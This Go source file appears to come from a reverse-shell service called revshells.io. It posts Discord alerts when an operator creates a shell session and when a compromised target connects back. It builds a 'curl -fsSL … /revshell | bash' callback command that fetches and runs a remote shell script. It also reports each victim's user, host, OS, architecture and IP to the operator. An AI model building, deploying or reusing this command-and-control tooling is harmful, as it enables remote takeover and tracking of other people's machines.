package notify

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
)

type Discord struct {
	WebhookURL string
	PublicURL  string
	Client     *http.Client
}

func NewDiscord(webhookURL, publicURL string) *Discord {
	return &Discord{
		WebhookURL: strings.TrimSpace(webhookURL),
		PublicURL:  strings.TrimRight(publicURL, "/"),
		Client:     &http.Client{Timeout: 10 * time.Second},
	}
}

func (d *Discord) Enabled() bool {
	return d != nil && d.WebhookURL != ""
}

func (d *Discord) SessionCreated(sess *protocol.Session, browserToken, operatorIP string) error {
	if !d.Enabled() || sess == nil {
		return nil
	}
	sessionURL := fmt.Sprintf("%s/%s", d.PublicURL, sess.ID)
	callback := fmt.Sprintf("curl -fsSL %s/%s/revshell | bash", d.PublicURL, sess.ID)
	return d.send(discordMessage{
		Username: "revshells.io",
		Embeds: []discordEmbed{{
			Title:       "New Session Created",
			Description: "A new reverse-shell session was created from the web UI.",
			Color:       0x58a6ff,
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Fields: []discordField{
				{Name: "Session", Value: backtick(sess.ID), Inline: true},
				{Name: "Name", Value: backtick(orDefault(sess.Name, "web")), Inline: true},
				{Name: "Operator IP", Value: backtick(orDefault(operatorIP, "unknown")), Inline: true},
				{Name: "Browser URL", Value: sessionURL},
				{Name: "Callback", Value: backtick(callback)},
			},
		}},
	})
}

func (d *Discord) CallbackConnected(sess *protocol.Session, target *protocol.Target, callbackIP string) error {
	if !d.Enabled() || sess == nil || target == nil {
		return nil
	}
	sessionURL := fmt.Sprintf("%s/%s", d.PublicURL, sess.ID)
	targetLabel := strings.TrimSpace(target.User + "@" + target.Host)
	if targetLabel == "@" || targetLabel == "" {
		targetLabel = target.Host
	}
	osLabel := strings.TrimSpace(target.System.OSName)
	if osLabel == "" {
		osLabel = strings.TrimSpace(target.OS)
	}
	if target.System.Arch != "" {
		osLabel = strings.TrimSpace(osLabel + " " + target.System.Arch)
	} else if target.Arch != "" {
		osLabel = strings.TrimSpace(osLabel + " " + target.Arch)
	}
	return d.send(discordMessage{
		Username: "revshells.io",
		Embeds: []discordEmbed{{
			Title:       "Callback Connected",
			Description: "A target successfully registered and attached to a session.",
			Color:       0x34d399,
			Timestamp:   time.Now().UTC().Format(time.RFC3339),
			Fields: []discordField{
				{Name: "Session", Value: backtick(sess.ID), Inline: true},
				{Name: "Mode", Value: backtick(orDefault(target.Mode, "unknown")), Inline: true},
				{Name: "Callback IP", Value: backtick(orDefault(callbackIP, "unknown")), Inline: true},
				{Name: "Target", Value: backtick(orDefault(targetLabel, "unknown")), Inline: true},
				{Name: "OS", Value: backtick(orDefault(osLabel, "unknown")), Inline: true},
				{Name: "Transport", Value: backtick(orDefault(target.Transport, "unknown")), Inline: true},
				{Name: "Session URL", Value: sessionURL},
			},
		}},
	})
}

func (d *Discord) send(msg discordMessage) error {
	body, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, d.WebhookURL, bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := d.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("discord webhook status %d", resp.StatusCode)
	}
	return nil
}

func orDefault(v, fallback string) string {
	if strings.TrimSpace(v) == "" {
		return fallback
	}
	return v
}

func backtick(v string) string {
	return "`" + strings.ReplaceAll(v, "`", "'") + "`"
}

type discordMessage struct {
	Username string         `json:"username,omitempty"`
	Embeds   []discordEmbed `json:"embeds"`
}

type discordEmbed struct {
	Title       string         `json:"title,omitempty"`
	Description string         `json:"description,omitempty"`
	Color       int            `json:"color,omitempty"`
	Timestamp   string         `json:"timestamp,omitempty"`
	Fields      []discordField `json:"fields,omitempty"`
}

type discordField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}
